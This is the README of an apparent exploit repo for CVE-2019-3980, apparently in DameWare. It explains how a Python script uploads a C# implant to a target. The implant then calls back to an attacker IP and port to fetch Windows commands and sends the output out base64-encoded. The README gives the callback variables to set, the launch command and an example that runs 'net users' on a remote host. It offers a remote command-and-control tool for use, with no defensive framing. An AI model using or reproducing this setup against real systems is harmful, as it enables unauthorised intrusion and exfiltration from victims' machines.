# CVE-2019-3980

This repo was created to utilize the Nessus POC with a custom C# executable to run commands on a remote host and get the output of the command.
<br />
<br />
The python file is used to start a web server, execute the exploit, and then get the results over the web server.<br />
The C# exe is uploaded through the exploit to the target. 
When executed on thte target, the exe calls back to the IP/Port specified to get the command to run (path is /cmd).<br />
Once the command finishes, the exe sends the output to the same webserver.
Sending the output is done through a GET request that will generate a 404, but thats fine we just want the base64 data.
<br />
<br />
C# exe has two variables that need to be updated<br />
These variables reference the attacking systems IP and Port<br />
string ip = "10.8.0.3"; <br />
string port = "8000";

<br />
--if port is updated, python script needs to be updated as well, variable to server the HTTP server is below in python script
PORT = 8000 
<br />
Wherever script is launched from needs to contain the file uploaded and well as file called "cmd" which contains the windows commands you want to run.
<br />
<br />
To use this script:<br />
Update variables<br />
create cmd file with commands to run on vulnerable host<br />
compile c# solution contained in zip file <br />
run python script:

python dameware-poc.py -t target_ip -e executable_to_upload
<br />

Example below runs the net users command on the remote host
<br />
![Alt text](/dameware-poc1.png?raw=true&sanitize=true)
<br />
![Alt text](/dameware-poc2.png?raw=true&sanitize=true)
